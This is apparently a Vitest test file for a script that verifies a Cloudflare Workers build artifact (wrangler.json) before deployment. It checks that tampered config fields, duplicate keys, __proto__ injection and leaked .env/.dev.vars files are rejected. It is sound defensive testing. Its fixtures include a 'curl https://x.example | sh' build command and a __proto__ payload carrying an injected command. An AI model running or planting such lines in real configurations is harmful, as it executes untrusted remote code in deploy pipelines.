// @vitest-environment node
// RIFA-021 (D18): scripts/conferir-artefato.mjs, a conferência do build antes de o token da Cloudflare entrar.
// O wrangler.jsonc é o do projeto, lido pelo wrangler. O wrangler.json "do build" daqui está escrito à mão
// com as diferenças que o @cloudflare/vite-plugin introduz (conferidas contra o build de verdade na
// RIFA-021); o job ci roda o script no build da main e o portão local da subida do plugin também (RIFA-072).
import {
  copyFileSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { unstable_readConfig } from "wrangler";
import {
  CONFIG_GERADA,
  CONTEUDO_DO_REDIRECIONAMENTO,
  REDIRECIONAMENTO,
  conferirArtefato,
  configEsperada,
  diferencas,
  principal,
} from "./conferir-artefato.mjs";

const lida = unstable_readConfig({ config: "wrangler.jsonc" });

/** O wrangler.json que o build gera hoje (wrangler 4.156.1, plugin 1.67.0), noutra máquina. */
function geradaPeloBuild() {
  const {
    build: _build,
    define: _define,
    unsafe: _unsafe,
    ...resto
  } = JSON.parse(JSON.stringify(lida));
  const caminho =
    "/home/runner/work/rifa-videira-kids/rifa-videira-kids/wrangler.jsonc";
  return {
    ...resto,
    configPath: caminho,
    userConfigPath: caminho,
    main: "index.js",
    no_bundle: true,
    rules: [{ type: "ESModule", globs: ["**/*.js", "**/*.mjs"] }],
    upload_source_maps: true,
    assets: {
      not_found_handling: "single-page-application",
      run_worker_first: ["/api", "/api/*"],
      directory: "../client",
    },
    d1_databases: [
      {
        binding: "DB",
        database_name: "rifa-videira-kids",
        database_id: lida.d1_databases[0].database_id,
        migrations_dir: "../../migrations",
      },
    ],
  };
}

describe("scripts/conferir-artefato.mjs: o wrangler.json gerado segue o wrangler.jsonc", () => {
  it("o do build atual não tem diferença (os caminhos da máquina do build não contam)", () => {
    expect(diferencas(geradaPeloBuild(), configEsperada(lida))).toEqual([]);
  });

  it.each([
    [
      "build.command (o wrangler deploy o executa)",
      (gerada) => (gerada.build = { command: "curl https://x.example | sh" }),
      ["build"],
    ],
    [
      "empacotar de novo (no_bundle false)",
      (gerada) => (gerada.no_bundle = false),
      ["no_bundle"],
    ],
    [
      "outro módulo principal",
      (gerada) => (gerada.main = "../../src/worker/index.ts"),
      ["main"],
    ],
    [
      "assets fora de dist/client",
      (gerada) => (gerada.assets.directory = "../.."),
      ["assets"],
    ],
    [
      "outro banco D1 da conta",
      (gerada) =>
        (gerada.d1_databases[0].database_id =
          "00000000-0000-0000-0000-000000000000"),
      ["d1_databases"],
    ],
    [
      "migrations de dentro do artefato",
      (gerada) => (gerada.d1_databases[0].migrations_dir = "../client/sql"),
      ["d1_databases"],
    ],
    [
      "binding a mais (KV)",
      (gerada) => (gerada.kv_namespaces = [{ binding: "KV", id: "abc" }]),
      ["kv_namespaces"],
    ],
    [
      "container (o deploy roda docker build)",
      (gerada) =>
        (gerada.containers = [{ class_name: "X", image: "./Dockerfile" }]),
      ["containers"],
    ],
    ["outra conta", (gerada) => (gerada.account_id = "outra"), ["account_id"]],
    [
      "rota noutro domínio",
      (gerada) => (gerada.routes = [{ pattern: "x.example/*" }]),
      ["routes"],
    ],
    [
      "regra de módulos a mais",
      (gerada) => gerada.rules.push({ type: "Text", globs: ["**/*.txt"] }),
      ["rules"],
    ],
  ])("recusa %s", (_caso, adulterar, chaves) => {
    const gerada = geradaPeloBuild();
    adulterar(gerada);
    expect(diferencas(gerada, configEsperada(lida))).toEqual(chaves);
  });
});

describe("scripts/conferir-artefato.mjs: principal, num diretório com o checkout e o artefato", () => {
  let raiz;
  const escrever = (caminho, conteudo) => {
    mkdirSync(join(raiz, caminho, ".."), { recursive: true });
    writeFileSync(join(raiz, caminho), conteudo);
  };
  const erros = () => console.error.mock.calls.map(([linha]) => linha);

  beforeEach(() => {
    raiz = mkdtempSync(join(tmpdir(), "conferir-artefato-"));
    copyFileSync("wrangler.jsonc", join(raiz, "wrangler.jsonc"));
    escrever(CONFIG_GERADA, JSON.stringify(geradaPeloBuild()));
    escrever("dist/client/index.html", "<!doctype html>");
    vi.spyOn(console, "error").mockImplementation(() => {});
    vi.spyOn(console, "log").mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
    rmSync(raiz, { recursive: true, force: true });
  });

  it("build certo: devolve 0 e escreve o redirecionamento igual ao do plugin", () => {
    expect(conferirArtefato(raiz)).toEqual([]);
    expect(principal(raiz)).toBe(0);
    expect(readFileSync(join(raiz, REDIRECIONAMENTO), "utf8")).toBe(
      '{"configPath":"../../dist/rifa_videira_kids/wrangler.json","auxiliaryWorkers":[]}',
    );
  });

  it("no job ci, aceita o redirecionamento do plugin e recusa outro, sem trocá-lo", () => {
    escrever(REDIRECIONAMENTO, JSON.stringify(CONTEUDO_DO_REDIRECIONAMENTO));
    expect(principal(raiz)).toBe(0);

    const outro = '{"configPath":"../../wrangler.jsonc"}';
    escrever(REDIRECIONAMENTO, outro);
    expect(principal(raiz)).toBe(1);
    expect(erros()).toEqual([
      `::error::${REDIRECIONAMENTO} difere do que o plugin grava.`,
    ]);
    expect(readFileSync(join(raiz, REDIRECIONAMENTO), "utf8")).toBe(outro);
  });

  it("build adulterado: devolve 1 e não escreve o redirecionamento (o wrangler deploy recusa sem ele)", () => {
    escrever(
      CONFIG_GERADA,
      JSON.stringify({ ...geradaPeloBuild(), build: { command: "id" } }),
    );
    expect(principal(raiz)).toBe(1);
    expect(erros()).toEqual([
      `::error::${CONFIG_GERADA}: "build" difere do que o wrangler.jsonc gera no build.`,
    ]);
    expect(existsSync(join(raiz, REDIRECIONAMENTO))).toBe(false);
  });

  // O JSON escrito à mão, com chaves que o JSON.stringify não produz. O wrangler 4.156.1 lê o wrangler.json
  // com o jsonc-parser: a chave "__proto__" vira o protótipo da configuração (o `build` dela seria herdado,
  // sem aparecer como chave própria), e numa chave repetida vale a última, como no JSON.parse daqui.
  it.each([
    [
      "um __proto__ com build (o wrangler herdaria o build.command)",
      '{"__proto__":{"build":{"command":"id"}},',
      "__proto__",
    ],
    [
      "build repetido na frente do JSON",
      '{"build":{"command":"id"},"build":{},',
      "build",
    ],
  ])("recusa %s", (_caso, comeco, chave) => {
    const resto = JSON.stringify(geradaPeloBuild()).slice(1);
    escrever(CONFIG_GERADA, comeco + resto);
    expect(principal(raiz)).toBe(1);
    expect(erros()).toEqual([
      `::error::${CONFIG_GERADA}: "${chave}" difere do que o wrangler.jsonc gera no build.`,
    ]);
    expect(existsSync(join(raiz, REDIRECIONAMENTO))).toBe(false);
  });

  it.each([
    ["sem o build", undefined, "não existe ou não é JSON"],
    ["JSON inválido", "{", "não existe ou não é JSON"],
    ["null", "null", "não é um objeto"],
    ["lista", "[]", "não é um objeto"],
  ])("recusa %s", (_caso, conteudo, mensagem) => {
    if (conteudo === undefined) rmSync(join(raiz, CONFIG_GERADA));
    else escrever(CONFIG_GERADA, conteudo);
    expect(principal(raiz)).toBe(1);
    expect(erros()).toEqual([expect.stringContaining(mensagem)]);
    expect(existsSync(join(raiz, REDIRECIONAMENTO))).toBe(false);
  });

  it("recusa .dev.vars e .env dentro do dist (o plugin os copia para o vite preview)", () => {
    escrever("dist/rifa_videira_kids/.dev.vars", "RIFEI_WEBHOOK_TOKEN=x");
    escrever("dist/client/.env.production", "X=1");
    escrever("dist/client/.envrc-nao-e-dotenv.txt", "");
    expect(conferirArtefato(raiz).sort()).toEqual([
      "dist/client/.env.production: segredo local dentro do build.",
      "dist/rifa_videira_kids/.dev.vars: segredo local dentro do build.",
    ]);
  });
});
